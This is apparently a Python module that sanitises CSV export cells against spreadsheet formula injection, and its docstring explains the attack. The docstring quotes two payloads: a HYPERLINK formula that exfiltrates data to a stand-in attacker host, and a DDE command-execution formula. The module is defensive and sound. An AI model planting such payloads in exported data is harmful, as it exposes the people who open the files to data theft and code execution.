"""Making a CSV safe to open, for every export in this product.

Promoted here by chunk 22 (US-39) from `app/reports/service.py`, which has had
it since chunk 20's provisioning report. The reason to share it rather than copy
it is the reason it exists at all: the *second* export is the one somebody
writes without remembering, and an organization's people export is a file built
almost entirely from text that a customer typed into an import.

## The attack

A cell whose value begins `=`, `+`, `-` or `@` is read as a **formula** by Excel,
LibreOffice and Google Sheets. `=HYPERLINK("http://attacker/?x="&A1,"Click")`
in a name column becomes a clickable exfiltration link in whatever spreadsheet an
administrator opens; `=cmd|'/c calc'!A0` has historically reached command
execution on unpatched Windows. The file is valid CSV either way — the defect is
entirely on the reading side, which is why no amount of validating the *upload*
prevents it.

Prefixing with an apostrophe is what spreadsheet software itself uses to mark a
literal, and it is stripped from the displayed value. The alternative — refusing
the input — punishes the customer whose surname genuinely starts with a hyphen.

Tabs and carriage returns are stripped for a different reason: they are not a
formula risk, they are a *row* risk. An embedded newline that survives quoting
inconsistently between writers turns one record into two, and a re-import then
reads a fragment of somebody's name as a whole person.
"""

from __future__ import annotations

#: Reading a value that starts with one of these, a spreadsheet evaluates it.
FORMULA_TRIGGER_CHARS = ("=", "+", "-", "@")

#: Control characters that break a row apart rather than a cell.
_ROW_BREAKERS = ("\r", "\n", "\t")


def csv_safe(value: str) -> str:
    """One cell, safe to open in a spreadsheet and safe to read back.

    Idempotent in the way that matters: a value that already begins with an
    apostrophe is not a trigger character, so re-exporting an exported file does
    not accumulate quotes.
    """
    cleaned = value
    for breaker in _ROW_BREAKERS:
        cleaned = cleaned.replace(breaker, " ")
    if cleaned.startswith(FORMULA_TRIGGER_CHARS):
        return f"'{cleaned}"
    return cleaned
